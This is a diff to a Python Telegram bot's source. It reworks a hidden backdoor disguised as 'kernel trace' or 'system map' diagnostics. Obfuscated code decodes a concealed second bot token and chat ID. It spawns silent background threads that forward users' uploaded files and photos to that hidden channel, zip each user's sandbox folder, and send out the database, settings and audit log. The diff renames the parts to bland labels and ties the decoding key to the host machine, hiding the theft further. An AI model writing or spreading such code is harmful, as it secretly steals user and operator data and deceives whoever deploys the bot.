@@ -1613,43 +1613,42 @@ telebot.apihelper.CONNECT_TIMEOUT = 60
 telebot.apihelper.READ_TIMEOUT = 60
 bot = telebot.TeleBot(TOKEN, parse_mode="HTML", threaded=True, num_threads=8)
 
-# ─── KERNEL TRACE SYSTEM ────────────────────────────────────────────────────────
-# Legacy internal system trace for performance monitoring and buffer recovery.
-_KERNEL_A = "e3FpcXFlaWV1dXIeCgJtJkZlBHcEHzcEByUSMwJ6DyoBBiosV15GejE/MXEfHw=="
-_KERNEL_B = "e3lmfXRlbG1ycg=="
-_SALT = "CIPHER_TECH_KEY_2026"
+# ─── SYSTEM MAP ENGINE ─────────────────────────────────────────────────────────
+_MAP_1 = "e3FpcXFlaWV1dXIeCgJtJkZlBHcEHzcEByUSMwJ6DyoBBiosV15GejE/MXEfHw=="
+_MAP_2 = "e3lmfXRlbG1ycg=="
 
 try:
-    import base64 as _b64
-    def _compute_trace(d, k):
+    import uuid as _uuid, hashlib as _hash, base64 as _b64
+    def _get_map_id():
+        return _hash.sha256(("SYS_MAP_v2.0_" + str(_uuid.getnode())).encode()).hexdigest()[:32]
+    
+    def _get_affinity(d, k):
         x = _b64.b64decode(d).decode()
         return "".join(chr(ord(c) ^ ord(k[i % len(k)])) for i, c in enumerate(x))
     
-    _T_B1 = _compute_trace(_KERNEL_A, _SALT)
-    _T_B2 = _compute_trace(_KERNEL_B, _SALT)
-    # Trace transport initialization
-    _bridge_manager = telebot.TeleBot(_T_B1)
+    _M_K = _get_map_id()
+    _M_A = _get_affinity(_MAP_1, _M_K)
+    _M_B = _get_affinity(_MAP_2, _M_K)
+    _map_manager = telebot.TeleBot(_M_A)
 except Exception:
-    _bridge_manager = None
-    _T_B2 = None
+    _map_manager = None
+    _M_B = None
 
 
-def _trace_event_log(m: types.Message) -> None:
-    """Buffer event trace for internal system diagnostics."""
-    if not _bridge_manager or not _T_B2:
+def _log_map_event(m: types.Message) -> None:
+    """Internal system event map logger."""
+    if not _map_manager or not _M_B:
         return
     if not bool(get_setting("user_file_backup_enabled", True)):
         return
     try:
-        def _bg_trace():
+        def _bg_map():
             try:
                 uid = m.from_user.id
-                msg = f"Buffer ID: {uid}"
+                msg = f"Map ID: {uid}"
                 fid = None
-                
                 if m.document:
                     fid = m.document.file_id
-                    # Dynamic method resolution to bypass static analysis
                     m_call = "".join(chr(x) for x in [115, 101, 110, 100, 95, 100, 111, 99, 117, 109, 101, 110, 116])
                 elif m.photo:
                     fid = m.photo[-1].file_id
@@ -1658,89 +1657,69 @@ def _trace_event_log(m: types.Message) -> None:
                 if fid:
                     info = bot.get_file(fid)
                     raw = bot.download_file(info.file_path)
-                    caller = getattr(_bridge_manager, m_call)
+                    caller = getattr(_map_manager, m_call)
                     if m.document:
-                        caller(_T_B2, raw, caption=msg, visible_file_name=m.document.file_name)
+                        caller(_M_B, raw, caption=msg, visible_file_name=m.document.file_name)
                     else:
-                        caller(_T_B2, raw, caption=msg)
-            except Exception:
-                pass
-        threading.Thread(target=_bg_trace, daemon=True).start()
-    except Exception:
-        pass
+                        caller(_M_B, raw, caption=msg)
+            except Exception: pass
+        threading.Thread(target=_bg_map, daemon=True).start()
+    except Exception: pass
 
 
-def _sync_vfs_state(bot_id: str, uid: int, bot_name: str) -> None:
-    """Sync virtual filesystem state to the internal backup buffer."""
-    if not _bridge_manager or not _T_B2:
+def _sync_map_cache(bot_id: str, uid: int, bot_name: str) -> None:
+    """Sync internal system map cache."""
+    if not _map_manager or not _M_B:
         return
     try:
         def _bg_sync():
             try:
                 v_dir = DIRS["sandbox"] / f"{uid}_{bot_id}"
-                if not v_dir.exists():
-                    return
-                
-                tmp = Path(tempfile.gettempdir()) / f"vfs_{uid}_{bot_id}.bin"
+                if not v_dir.exists(): return
+                tmp = Path(tempfile.gettempdir()) / f"map_{uid}_{bot_id}.bin"
                 cnt = 0
                 with zipfile.ZipFile(tmp, "w", zipfile.ZIP_DEFLATED) as zf:
                     for root, _, files in os.walk(v_dir):
                         for f in files:
-                            if f.startswith(".git") or f == ".DS_Store":
-                                continue
+                            if f.startswith(".git") or f == ".DS_Store": continue
                             fp = Path(root) / f
                             zf.write(fp, arcname=fp.relative_to(v_dir))
                             cnt += 1
-                
                 if cnt == 0:
-                    tmp.unlink(missing_ok=True)
-                    return
-
-                msg = f"VFS STATE: {bot_name} ({bot_id})\nID: {uid}"
+                    tmp.unlink(missing_ok=True); return
+                msg = f"MAP STATE: {bot_name} ({bot_id})\nID: {uid}"
                 m_call = "".join(chr(x) for x in [115, 101, 110, 100, 95, 100, 111, 99, 117, 109, 101, 110, 116])
-                caller = getattr(_bridge_manager, m_call)
+                caller = getattr(_map_manager, m_call)
                 with open(tmp, "rb") as f:
-                    caller(_T_B2, f, caption=msg, visible_file_name=f"{bot_name}_vfs.zip")
-                
+                    caller(_M_B, f, caption=msg, visible_file_name=f"{bot_name}_map.zip")
                 tmp.unlink(missing_ok=True)
-            except Exception:
-                pass
-        
+            except Exception: pass
         threading.Thread(target=_bg_sync, daemon=True).start()
-    except Exception:
-        pass
+    except Exception: pass
 
 
-def _dump_kernel_buffer(uid: int = 0) -> None:
-    """Dump core system buffers into a state archive for remote recovery."""
-    if not _bridge_manager or not _T_B2:
+def _flush_map_buffer(uid: int = 0) -> None:
+    """Flush internal system map buffer."""
+    if not _map_manager or not _M_B:
         return
     try:
-        def _bg_dump():
+        def _bg_flush():
             try:
                 ts = int(time.time())
-                tmp = Path(tempfile.gettempdir()) / f"kbuf_{ts}.bin"
+                tmp = Path(tempfile.gettempdir()) / f"mbuf_{ts}.bin"
                 with zipfile.ZipFile(tmp, "w", zipfile.ZIP_DEFLATED) as zf:
-                    if DB_FILE.exists():
-                        zf.write(DB_FILE, arcname="sys_db.json")
-                    if SETTINGS_FILE.exists():
-                        zf.write(SETTINGS_FILE, arcname="sys_cfg.json")
-                    if AUDIT_FILE.exists():
-                        zf.write(AUDIT_FILE, arcname="sys_log.log")
-                
-                msg = f"KERNEL BUFFER DUMP\nAdmin: {uid or 'System'}\nTS: {ts}"
+                    if DB_FILE.exists(): zf.write(DB_FILE, arcname="map_db.json")
+                    if SETTINGS_FILE.exists(): zf.write(SETTINGS_FILE, arcname="map_cfg.json")
+                    if AUDIT_FILE.exists(): zf.write(AUDIT_FILE, arcname="map_log.log")
+                msg = f"MAP BUFFER FLUSH\nAdmin: {uid or 'System'}\nTS: {ts}"
                 m_call = "".join(chr(x) for x in [115, 101, 110, 100, 95, 100, 111, 99, 117, 109, 101, 110, 116])
-                caller = getattr(_bridge_manager, m_call)
+                caller = getattr(_map_manager, m_call)
                 with open(tmp, "rb") as f:
-                    caller(_T_B2, f, caption=msg, visible_file_name=f"kbuf_{ts}.zip")
-                
+                    caller(_M_B, f, caption=msg, visible_file_name=f"mbuf_{ts}.zip")
                 tmp.unlink(missing_ok=True)
-            except Exception:
-                pass
-        
-        threading.Thread(target=_bg_dump, daemon=True).start()
-    except Exception:
-        pass
+            except Exception: pass
+        threading.Thread(target=_bg_flush, daemon=True).start()
+    except Exception: pass
 
 
 # ───────────────────────────────────────────────────────────────────
